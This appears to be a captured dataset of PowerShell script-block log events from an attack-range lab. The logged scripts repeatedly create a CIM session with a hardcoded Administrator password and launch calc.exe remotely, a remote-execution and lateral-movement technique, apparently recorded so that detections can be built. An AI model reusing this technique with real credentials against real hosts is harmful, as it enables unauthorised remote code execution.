@@ -1,0 +1,1429 @@
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713197600Z'/><EventRecordID>743699</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>4f2be20e-215c-4069-b115-dcb6f5e143f2</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713178400Z'/><EventRecordID>743693</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>0bd5bb9d-853e-4368-84bb-74015995c35e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713160800Z'/><EventRecordID>743687</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>13205f20-1231-4aba-9781-3eadec3fdd49</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.538372000Z'/><EventRecordID>743669</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-7E56-DF2E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>5ef41027-4973-4e23-afa2-855c1e967677</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.523788200Z'/><EventRecordID>743667</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-7D56-DF2E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>18410b56-5490-4029-be5e-f013d73a65f7</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271099300Z'/><EventRecordID>743497</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>15d38b1d-849c-43eb-a2a2-85f2676ba4b1</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271081300Z'/><EventRecordID>743491</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>b1e25456-09b9-4e57-9063-ba36db31b1e0</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271069400Z'/><EventRecordID>743485</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>6a4b0aa7-c82a-463d-b82c-7f7bab168b82</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.088952000Z'/><EventRecordID>743467</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-325C-E42E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>8a275f67-a36a-401b-b2b0-b280ea086d77</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.078286000Z'/><EventRecordID>743465</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-315C-E42E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>28c17cce-4080-4f0e-baa0-9d0d3e105b4d</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891708200Z'/><EventRecordID>743128</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>a7c01901-d258-4f7b-9df1-114206b8a18c</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891688500Z'/><EventRecordID>743122</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>4de3b840-cd7a-4c85-b155-50404f8c571b</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891661900Z'/><EventRecordID>743116</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>81b15fb2-b2f5-4be1-9a7a-273ad54a4fb3</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.585178900Z'/><EventRecordID>743098</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-62B0-E02E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>288323c2-9629-47a5-afa1-0f66c33f4b18</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.569786400Z'/><EventRecordID>743096</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-61B0-E02E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
+ $RemoteComputer = "localhost"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>f119f71b-cbd0-44f0-a261-111bdfc9df7a</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T12:04:06.495805400Z'/><EventRecordID>740802</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-5E7B-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
+ $RemoteComputer = "mswin-dc01.attackrange.local"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>a2c58e4e-3455-484a-aa3a-6bb3a26253d2</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:54:54.583245400Z'/><EventRecordID>740660</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BEA0-E02E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
+ $RemoteComputer = "mswin-dc01.attackrange.local"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>b799d98a-bf2e-4200-9152-1e26234deadd</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490263900Z'/><EventRecordID>740438</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>51ac8f61-06b2-4cc9-9218-edae28af6b52</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490236400Z'/><EventRecordID>740432</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>5348ab7f-064a-4018-a13a-2d47b3f6173e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490218000Z'/><EventRecordID>740426</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>ef0a8a80-67aa-495e-aec6-fa8c5c0f828b</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.235688200Z'/><EventRecordID>740408</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-F9A2-DF2E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
+ $RemoteComputer = "mswin-dc01.attackrange.local"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>9b0c3fb8-653f-4a2a-b7bd-8eb11b43e918</Data><Data Name='Path'></Data></EventData></Event>
